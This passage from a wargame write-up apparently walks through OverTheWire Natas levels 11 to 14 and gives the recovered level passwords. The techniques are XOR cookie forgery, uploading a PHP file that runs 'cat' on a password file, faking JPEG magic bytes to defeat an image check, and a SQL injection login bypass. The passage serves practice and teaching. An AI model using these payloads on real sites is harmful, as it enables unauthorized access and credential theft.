</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$text</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$outText</span> <span class="o">.=</span> <span class="nv">$text</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">^</span> <span class="nv">$key</span><span class="p">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$key</span><span class="p">)];</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="nv">$outText</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">loadData</span><span class="p">(</span><span class="nv">$def</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">global</span> <span class="nv">$_COOKIE</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$mydata</span> <span class="o">=</span> <span class="nv">$def</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;data&quot;</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$tempdata</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nx">xor_encrypt</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">&quot;data&quot;</span><span class="p">])),</span> <span class="k">true</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$tempdata</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;showpassword&quot;</span><span class="p">,</span> <span class="nv">$tempdata</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;bgcolor&quot;</span><span class="p">,</span> <span class="nv">$tempdata</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^#(?:[a-f\d]{6})$/i&#39;</span><span class="p">,</span> <span class="nv">$tempdata</span><span class="p">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>        <span class="nv">$mydata</span><span class="p">[</span><span class="s1">&#39;showpassword&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$tempdata</span><span class="p">[</span><span class="s1">&#39;showpassword&#39;</span><span class="p">];</span>
</span><span class='line'>        <span class="nv">$mydata</span><span class="p">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$tempdata</span><span class="p">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="p">];</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="nv">$mydata</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">saveData</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">setcookie</span><span class="p">(</span><span class="s2">&quot;data&quot;</span><span class="p">,</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nx">xor_encrypt</span><span class="p">(</span><span class="nb">json_encode</span><span class="p">(</span><span class="nv">$d</span><span class="p">))));</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$data</span> <span class="o">=</span> <span class="nx">loadData</span><span class="p">(</span><span class="nv">$defaultdata</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;bgcolor&quot;</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^#(?:[a-f\d]{6})$/i&#39;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>        <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="p">];</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nx">saveData</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'>
</span><span class='line'><span class="cp">&lt;?</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s2">&quot;showpassword&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;yes&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;The password for natas12 is &lt;censored&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Well, looking at the page, we see a <em>data</em> cookie that&rsquo;s base64 encoded, but decoding it gives rubbish because it&rsquo;s XOR encrypted. The PHP code operates on it. We can also set the background color by giving it a valid value.</p>

<p>Now for the code! Breaking it down:</p>

<ul>
<li><p>The default data is an array comprised of the values <em>showpassword</em> set to no and <em>bgcolor</em> set to #ffffff</p></li>
<li><p>The xor_encrypt function performs XOR encryption on the given input</p></li>
<li><p>The loadData function loads the data from the cookie, or keeps the default values if the data is invalid.</p></li>
<li><p>The saveData function sets the cookie&rsquo;s value by the process of  <code>JSON encode &ndash;> XOR encrypt &ndash;> base64 encode</code></p></li>
</ul>


<p>At the end, we can see that if <em>showpassword</em> is set to yes, the password for the next level will be displayed. To achieve this, we have to mirror the cookie creation process, and change that value accordingly. But we don&rsquo;t have the key used for the XOR encryption. However, we know that in XOR encryption, <code>original xor key = encrypted</code>, and the following also applies: <code>original xor encrypted = key</code>. Because we have both the original data and the encrypted version, we can recover the key!</p>

<p>I kept the original code since it does all the work, and only made some modifications to the variables:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="c1">// the value of the cookie after base64 decoding</span>
</span><span class='line'><span class="nv">$original</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="s1">&#39;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=&#39;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">xor_encrypt</span><span class="p">(</span><span class="nv">$in</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$defaultdata</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> <span class="s2">&quot;showpassword&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;no&quot;</span><span class="p">,</span> <span class="s2">&quot;bgcolor&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;#ffffff&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="c1">// the json encoded version of the default data</span>
</span><span class='line'>    <span class="nv">$key</span> <span class="o">=</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$defaultdata</span><span class="p">);</span>
</span><span class='line'>    <span class="nv">$text</span> <span class="o">=</span> <span class="nv">$in</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$outText</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// Iterate through each character</span>
</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$text</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$outText</span> <span class="o">.=</span> <span class="nv">$text</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">^</span> <span class="nv">$key</span><span class="p">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$key</span><span class="p">)];</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="nv">$outText</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="nx">xor_encrypt</span><span class="p">(</span><span class="nv">$original</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Ran this through the PHP sandbox at <a href="http://sandbox.onlinephpfunctions.com/">http://sandbox.onlinephpfunctions.com/</a> and the result was the string <code>qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq</code>. The string <em>qw8J</em> gets repeated, this is the key! Now we can reuse the code to create a cookie encrypted with this key, and with <em>showpassword</em> set to yes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nv">$defaultdata</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> <span class="s2">&quot;showpassword&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;yes&quot;</span><span class="p">,</span> <span class="s2">&quot;bgcolor&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;#ffffff&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nv">$json_data</span> <span class="o">=</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$defaultdata</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">xor_encrypt</span><span class="p">(</span><span class="nv">$in</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$key</span> <span class="o">=</span> <span class="s1">&#39;qw8J&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$text</span> <span class="o">=</span> <span class="nv">$in</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$outText</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// Iterate through each character</span>
</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$text</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$outText</span> <span class="o">.=</span> <span class="nv">$text</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">^</span> <span class="nv">$key</span><span class="p">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$key</span><span class="p">)];</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$outText</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="nx">xor_encrypt</span><span class="p">(</span><span class="nv">$json_data</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Running this code gives a new cookie value: <code>ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK</code>. Replace the cookie value in the page and you will get the next password: <code>The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3</code></p>

<h3>Level 12</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas12.png" title="natas12" alt="natas 12"></p>

<p>For this mission it seems we can upload a file to the server.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">genRandomString</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$length</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$characters</span> <span class="o">=</span> <span class="s2">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$string</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="nv">$p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$p</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$p</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="nv">$string</span> <span class="o">.=</span> <span class="nv">$characters</span><span class="p">[</span><span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$characters</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)];</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="nv">$string</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">makeRandomPath</span><span class="p">(</span><span class="nv">$dir</span><span class="p">,</span> <span class="nv">$ext</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">do</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$path</span> <span class="o">=</span> <span class="nv">$dir</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nx">genRandomString</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;.&quot;</span><span class="o">.</span><span class="nv">$ext</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$path</span><span class="p">));</span>
</span><span class='line'>    <span class="k">return</span> <span class="nv">$path</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">makeRandomPathFromFilename</span><span class="p">(</span><span class="nv">$dir</span><span class="p">,</span> <span class="nv">$fn</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$fn</span><span class="p">,</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="nx">makeRandomPath</span><span class="p">(</span><span class="nv">$dir</span><span class="p">,</span> <span class="nv">$ext</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;filename&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$target_path</span> <span class="o">=</span> <span class="nx">makeRandomPathFromFilename</span><span class="p">(</span><span class="s2">&quot;upload&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;filename&quot;</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploadedfile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">])</span> <span class="o">&gt;</span> <span class="mi">1000</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;File is too big&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploadedfile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$target_path</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;The file &lt;a href=</span><span class="se">\&quot;</span><span class="si">$target_path</span><span class="se">\&quot;</span><span class="s2">&gt;</span><span class="si">$target_path</span><span class="s2">&lt;/a&gt; has been uploaded&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span> <span class="k">else</span><span class="p">{</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;There was an error uploading the file, please try again!&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


<p>The code tests if the file satisfies the constraints and uploads it with a new name that&rsquo;s randomly generated. Then it gives you the link where you can find it:</p>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/upload.png" title="upload" alt="upload"></p>

<p>So I tried uploading a PHP file that would read the password for the next level:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# cat pass.php 
</span><span class='line'>&lt;?
</span><span class='line'>echo(exec('cat /etc/natas_webpass/natas13'));
</span><span class='line'>?&gt;</span></code></pre></td></tr></table></div></figure>


<p>But the extension is changed to a jpg, so the code doesn&rsquo;t get executed. Further in the HTML there is this line:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;filename&quot;</span> <span class="na">value=</span><span class="s">&quot;&lt;? print genRandomString(); ?&gt;.jpg&quot;</span> <span class="nt">/&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>I used Firebug to change the jpg extension to a php one and re-uploaded the file and this time it worked: <code>The file upload/g72k7zidu8.php has been uploaded</code>. Next I followed the link and inside was the password: <code>jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY</code></p>

<h3>Level 13</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas13.png" title="natas13" alt="natas 13"></p>

<p>Ok, this time they made a modification so that only jpg files can be uploaded..or so they claim. The code is the same as the last challenge, except for a new check:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nb">exif_imagetype</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploadedfile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;File is not an image&quot;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p><strong>exif_imagetype()</strong> reads the first bytes of an image and checks its signature. If the signature is invalid, it returns False.</p>

<p>This type of check can be fooled by providing the specific magic number for the file in question. The signature for jpg files is the hex value 0xFFD8FFE0</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# echo -e '\xFF\xD8\xFF\xE0' &gt; pass.php
</span><span class='line'>root@kali:~/Desktop# echo "&lt;?echo(exec('cat /etc/natas_webpass/natas13'));?&gt;" &gt;&gt; pass.php </span></code></pre></td></tr></table></div></figure>


<p>The upload process is the same (don&rsquo;t forget to modify the extension with Firebug or other tools). Then I went to the link and the password is  <code>Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1</code>. If you notice the weird looking characters ÿØÿà before it, it&rsquo;s because the text representation of the jpg magic number is also echoed back. The password starts after that</p>

<h3>Level 14</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas14.png" title="natas14" alt="natas 14"></p>

<p>Looking at the code hints at what type of vulnerability can be exploited:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;username&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$link</span> <span class="o">=</span> <span class="nb">mysql_connect</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="s1">&#39;natas14&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;censored&gt;&#39;</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">mysql_select_db</span><span class="p">(</span><span class="s1">&#39;natas14&#39;</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * from users where username=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> and password=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;password&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;debug&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;Executing query: </span><span class="si">$query</span><span class="s2">&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;Successful login! The password for natas15 is &lt;censored&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;Access denied!&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nb">mysql_close</span><span class="p">(</span><span class="nv">$link</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


<p>No input sanitization = SQL injection! Moreover, we can get additional information by setting debug to True in the URL. For that, I also included the username and password fields in the URL: <a href="http://natas14.natas.labs.overthewire.org/index.php?debug=True&amp;username=test&amp;password=pass">http://natas14.natas.labs.overthewire.org/index.php?debug=True&amp;username=test&amp;password=pass</a></p>

<p>And now there was a message showing the query that was run on the backend:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> Executing query: SELECT * from users where username="test" and password="pass"
</span><span class='line'>Access denied!</span></code></pre></td></tr></table></div></figure>


<p>After seeing how the query looks like, I used the following injection string to fool the database:</p>

<p>username = can be anything</p>

<p>password = <code>pass" or 1=1&mdash; </code></p>

<p>To see why this works, look at the query now:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="n">Executing</span> <span class="n">query</span><span class="p">:</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="ss">&quot;test&quot;</span> <span class="k">and</span> <span class="n">password</span><span class="o">=</span><span class="ss">&quot;pass&quot;</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">-- &quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>By fixing the quotes we forced the database to evaluate an always true condition (1=1) and bypass the credentials check. The <code>&mdash; </code> comments out the rest of the query which would otherwise break our injection. If you inject in the URL, don&rsquo;t forget that you need to URL encode the space (%20)</p>

<p>After the SQL injection, you will see this: <code>Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J</code></p>

<h3>Level 15</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas15.png" title="natas15" alt="natas 15"></p>

<p>This time you can check if a username exists or not. Let&rsquo;s look at the code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
